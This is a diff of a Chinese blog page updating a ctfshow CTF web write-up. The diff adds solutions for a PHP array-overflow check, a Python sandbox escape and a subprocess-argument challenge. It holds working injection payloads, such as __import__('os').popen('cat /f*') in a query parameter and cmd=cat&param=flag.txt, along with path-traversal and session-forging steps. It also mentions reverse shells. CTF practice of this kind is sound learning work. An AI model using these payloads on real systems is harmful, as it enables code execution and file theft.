@@ -25,7 +25,7 @@
 <meta property="og:description" content="ctfshow菜狗杯 小灯刷题经历(实则是复健的一环)   主要是web题目，misc比较简单这里不放  1.抽老婆 这集神了 任意文件下载漏洞： 1网址+&#x2F;download?file&#x3D;..&#x2F;..&#x2F;app.py 相对路径读到源码。 12345# 使用 Python 字典格式（注意：True 要大写）python3 flask_session_cookie_manager3.py encode \">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2026-07-15T07:51:37.000Z">
-<meta property="article:modified_time" content="2026-07-19T03:14:43.314Z">
+<meta property="article:modified_time" content="2026-07-19T08:23:37.281Z">
 <meta property="article:author" content="Cl1ck-t0">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary">
@@ -156,7 +156,7 @@
     <div class="sidebar-wrap" data-aos="fade-up">
           <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF"><span class="toc-number">1.</span> <span class="toc-text"> ctfshow菜狗杯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E6%8A%BD%E8%80%81%E5%A9%86"><span class="toc-number">1.1.</span> <span class="toc-text"> 1.抽老婆</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E4%B8%80%E8%A8%80%E6%97%A2%E5%87%BA"><span class="toc-number">1.2.</span> <span class="toc-text"> 2.一言既出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E9%A9%B7%E9%A9%AC%E9%9A%BE%E8%BF%BD"><span class="toc-number">1.3.</span> <span class="toc-text"> 3.驷马难追</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4taptaptap"><span class="toc-number">1.4.</span> <span class="toc-text"> 4.TapTapTap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5webshell"><span class="toc-number">1.5.</span> <span class="toc-text"> 5.Webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E5%8C%96%E9%9B%B6%E4%B8%BA%E6%95%B4"><span class="toc-number">1.6.</span> <span class="toc-text"> 6.化零为整</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E6%97%A0%E4%B8%80%E5%B9%B8%E5%85%8D"><span class="toc-number">1.7.</span> <span class="toc-text"> 7.无一幸免</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8%E4%BC%A0%E8%AF%B4%E4%B9%8B%E4%B8%8B%E9%9B%BE"><span class="toc-number">1.8.</span> <span class="toc-text"> 8.传说之下（雾）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9"><span class="toc-number">1.9.</span> <span class="toc-text"> 9.</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF"><span class="toc-number">1.</span> <span class="toc-text"> ctfshow菜狗杯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E6%8A%BD%E8%80%81%E5%A9%86"><span class="toc-number">1.1.</span> <span class="toc-text"> 1.抽老婆</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E4%B8%80%E8%A8%80%E6%97%A2%E5%87%BA"><span class="toc-number">1.2.</span> <span class="toc-text"> 2.一言既出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E9%A9%B7%E9%A9%AC%E9%9A%BE%E8%BF%BD"><span class="toc-number">1.3.</span> <span class="toc-text"> 3.驷马难追</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4taptaptap"><span class="toc-number">1.4.</span> <span class="toc-text"> 4.TapTapTap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5webshell"><span class="toc-number">1.5.</span> <span class="toc-text"> 5.Webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E5%8C%96%E9%9B%B6%E4%B8%BA%E6%95%B4"><span class="toc-number">1.6.</span> <span class="toc-text"> 6.化零为整</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E6%97%A0%E4%B8%80%E5%B9%B8%E5%85%8D"><span class="toc-number">1.7.</span> <span class="toc-text"> 7.无一幸免</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8%E4%BC%A0%E8%AF%B4%E4%B9%8B%E4%B8%8B%E9%9B%BE"><span class="toc-number">1.8.</span> <span class="toc-text"> 8.传说之下（雾）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9%E7%AE%97%E5%8A%9B%E8%B6%85%E7%BE%A4"><span class="toc-number">1.9.</span> <span class="toc-text"> 9.算力超群</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10easypython_p"><span class="toc-number">1.10.</span> <span class="toc-text"> 10.easyPytHon_P</span></a></li></ol></li></ol>
 </div>
 </div>
           <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -286,6 +286,11 @@
 <p>直接上payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://7f55dffa-8ffd-42cc-ac95-1a52600748d2.challenge.ctf.show/?0</span><br></pre></td></tr></table></figure>
 <p>ctfshow{8c244622-0063-4cb5-8bda-34744bfc2b1a}</p>
+<p>题目有问题，本来应该是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">COPYif ($arr[]=1)&#123;</span><br><span class="line">        die($flag);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;nonono!&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这样对$arr[]进行一个赋值，如果不进行特殊操作是恒为真的，所以要让这个赋值操作中断</p>
+<p>中断原理就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">COPY索引数组最大下标等于最大int数，对其追加会导致整型数溢出，进而引起追加失败</span><br><span class="line">int范围查阅Manual可知：32位最大是231-1，64位是263-1</span><br><span class="line">也就是2147483647与9223372036854775807</span><br></pre></td></tr></table></figure>
 <h2 id="8传说之下雾"><a class="markdownIt-Anchor" href="#8传说之下雾"></a> 8.传说之下（雾）</h2>
 <p>游戏题看源码：</p>
 <p>发现没有直接给出flag，而是通过调用console解密</p>
@@ -293,7 +298,23 @@
 <p>或者控制台输入Game修改score再吃一个豆就可以在控制台找到flag</p>
 <p>服了应该是平台出问题了导致flag资源404，分数都够了，这期神了</p>
 <p>不管了</p>
-<h2 id="9"><a class="markdownIt-Anchor" href="#9"></a> 9.</h2>
+<h2 id="9算力超群"><a class="markdownIt-Anchor" href="#9算力超群"></a> 9.算力超群</h2>
+<p>不会做，看了大佬题解，emmmmmm</p>
+<p>沙箱逃逸</p>
+<p>我们用bp抓包，把num2改为长字符串可以得到部分源码</p>
+<p>发现num2的判断非常宽松</p>
+<p>于是注入攻击payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?number1=&amp;operator=&amp;number2=__import__(&quot;os&quot;).popen(&quot;cat /f*&quot;).read()</span><br></pre></td></tr></table></figure>
+<p>得到flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;46c6102c-8aa3-4999-98ac-6c4a6c680c6d&#125;</span><br></pre></td></tr></table></figure>
+<p>当然，也可以将flag写入hint页面或反弹shell到自己的服务器中。</p>
+<h2 id="10easypython_p"><a class="markdownIt-Anchor" href="#10easypython_p"></a> 10.easyPytHon_P</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">源码在此：</span><br><span class="line"></span><br><span class="line">来自Flask导入请求</span><br><span class="line">CMD： str = request.form.get（&#x27;cmd&#x27;）</span><br><span class="line">param： str = request.form.get（&#x27;param&#x27;）</span><br><span class="line"># ------------------------------------- 不要修改 ↑ 他们 ↑！但你可以写代码↓</span><br><span class="line">import subprocess， os</span><br><span class="line">if cmd不是None，param也不是None：</span><br><span class="line">try：</span><br><span class="line">tVar = subprocess.run（[cmd[：3]， param， __file__]， cwd=os.getcwd（）， timeout=5）</span><br><span class="line">print（&#x27;Done！&#x27;）</span><br><span class="line">除了子进程。超时已过：</span><br><span class="line">打印（“”暂停！“）</span><br><span class="line">例外：</span><br><span class="line">print（&#x27;错误！&#x27;）</span><br><span class="line">否则：</span><br><span class="line">印刷（“无旗帜！”）</span><br><span class="line"></span><br><span class="line">如果环境出现故障，请访问 这里 尝试恢复。</span><br><span class="line"></span><br><span class="line">大菜鸡敬上！</span><br></pre></td></tr></table></figure>
+<p>payload：</p>
+<p>POST:</p>
+<p>cmd=cat&amp;param=flag.txt</p>
+<p>CTFSHOW{FAD568F-3968-4898-99d5-F44024B8FCB3}</p>
+<p>不知道为什么，大写小写都是错的😡，不管了，反正也是平台返回的flagQAQ</p>
 
     </div>
     <footer class="article-footer">
@@ -302,7 +323,7 @@
     <p><strong><span class="icon-link icon"></span>Permalink: </strong><a href="https://cl1ck-t0.github.io/2026/07/15/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/">https://cl1ck-t0.github.io/2026/07/15/ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF/</a></p>
     
     <p><strong><span class="icon-calendar icon"></span>Published: </strong>2026-07-15 15:51:37</p>
-    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-07-19 11:14:43</p>
+    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-07-19 16:23:37</p>
     <p><strong><span class="icon-copyright icon"></span>License: </strong>All articles on this blog are licensed under the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener nofollow noreferrer" target="_blank"><span class="icon-creative-commons"></span>BY-NC-SA</a> license agreement unless otherwise stated. Please indicate the source when reprinting!</p>
     <span class="icon-creative-commons article-copyright-bg"></span>
   </blockquote>
@@ -344,7 +365,7 @@
   </div>
     <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
       <div class="article-nav-link-wrap left">
-            <img data-src="/covers/acheron-honkai-star-3840x2160-19696.jpg" data-sizes="auto" alt="新生赛赛后总结" class="lazyload">
+            <img data-src="/covers/6b30891ec859ad095e8049c0da839fa3.jpg" data-sizes="auto" alt="新生赛赛后总结" class="lazyload">
         <a href="/2026/07/17/%E6%96%B0%E7%94%9F%E8%B5%9B%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/" aria-label="Prev: 新生赛赛后总结" title="Prev: 新生赛赛后总结"></a>
         <div class="article-nav-caption">Prev</div>
         <h3 class="article-nav-title">
@@ -352,7 +373,7 @@
         </h3>
       </div>
     <div class="article-nav-link-wrap right">
-          <img data-src="/covers/2dd3c93383eb0db22386ffb43181a8d9.jpg" data-sizes="auto" alt="ACTF2025" class="lazyload">
+          <img data-src="/covers/castorice-purple-3840x2160-22219.jpg" data-sizes="auto" alt="ACTF2025" class="lazyload">
       <a href="/2026/07/14/ACTF2025/" aria-label="Next: ACTF2025"  title="Next: ACTF2025"></a>
       <div class="article-nav-caption">Next</div>
       <h3 class="article-nav-title">
@@ -401,10 +422,10 @@
       </div>
       <div>
         <span class="icon-brush"></span>
-        37k
+        37.4k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        02:51
+        02:53
       </div>
       <div>
         <span class="icon-eye"></span>
@@ -426,7 +447,7 @@
   <div class="sidebar-wrap">
         <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF"><span class="toc-number">1.</span> <span class="toc-text"> ctfshow菜狗杯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E6%8A%BD%E8%80%81%E5%A9%86"><span class="toc-number">1.1.</span> <span class="toc-text"> 1.抽老婆</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E4%B8%80%E8%A8%80%E6%97%A2%E5%87%BA"><span class="toc-number">1.2.</span> <span class="toc-text"> 2.一言既出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E9%A9%B7%E9%A9%AC%E9%9A%BE%E8%BF%BD"><span class="toc-number">1.3.</span> <span class="toc-text"> 3.驷马难追</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4taptaptap"><span class="toc-number">1.4.</span> <span class="toc-text"> 4.TapTapTap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5webshell"><span class="toc-number">1.5.</span> <span class="toc-text"> 5.Webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E5%8C%96%E9%9B%B6%E4%B8%BA%E6%95%B4"><span class="toc-number">1.6.</span> <span class="toc-text"> 6.化零为整</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E6%97%A0%E4%B8%80%E5%B9%B8%E5%85%8D"><span class="toc-number">1.7.</span> <span class="toc-text"> 7.无一幸免</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8%E4%BC%A0%E8%AF%B4%E4%B9%8B%E4%B8%8B%E9%9B%BE"><span class="toc-number">1.8.</span> <span class="toc-text"> 8.传说之下（雾）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9"><span class="toc-number">1.9.</span> <span class="toc-text"> 9.</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow%E8%8F%9C%E7%8B%97%E6%9D%AF"><span class="toc-number">1.</span> <span class="toc-text"> ctfshow菜狗杯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E6%8A%BD%E8%80%81%E5%A9%86"><span class="toc-number">1.1.</span> <span class="toc-text"> 1.抽老婆</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E4%B8%80%E8%A8%80%E6%97%A2%E5%87%BA"><span class="toc-number">1.2.</span> <span class="toc-text"> 2.一言既出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E9%A9%B7%E9%A9%AC%E9%9A%BE%E8%BF%BD"><span class="toc-number">1.3.</span> <span class="toc-text"> 3.驷马难追</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4taptaptap"><span class="toc-number">1.4.</span> <span class="toc-text"> 4.TapTapTap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5webshell"><span class="toc-number">1.5.</span> <span class="toc-text"> 5.Webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E5%8C%96%E9%9B%B6%E4%B8%BA%E6%95%B4"><span class="toc-number">1.6.</span> <span class="toc-text"> 6.化零为整</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E6%97%A0%E4%B8%80%E5%B9%B8%E5%85%8D"><span class="toc-number">1.7.</span> <span class="toc-text"> 7.无一幸免</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8%E4%BC%A0%E8%AF%B4%E4%B9%8B%E4%B8%8B%E9%9B%BE"><span class="toc-number">1.8.</span> <span class="toc-text"> 8.传说之下（雾）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9%E7%AE%97%E5%8A%9B%E8%B6%85%E7%BE%A4"><span class="toc-number">1.9.</span> <span class="toc-text"> 9.算力超群</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10easypython_p"><span class="toc-number">1.10.</span> <span class="toc-text"> 10.easyPytHon_P</span></a></li></ol></li></ol>
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -565,7 +586,7 @@
           description: "",
           stripContent: " ctfshow菜狗杯 小灯刷题经历(实则是复健的一环)   主要是web题目，misc比较简单这里不放  1.抽老婆 这集神了 任意文件下载漏洞： 1网址+/download?file=../../app.py 相对路径读到源码。 12345# 使用 Python 字典格式（注意：True 要大写）python3 flask_session_cookie_manager3.py encode \    -s &amp;#x27;tanji_is_A_boy_Yooooooooooooooooooooo",
           date: "Wed Jul 15 2026 15:51:37 GMT+0800",
-          updated: "Sun Jul 19 2026 11:14:43 GMT+0800",
+          updated: "Sun Jul 19 2026 16:23:37 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
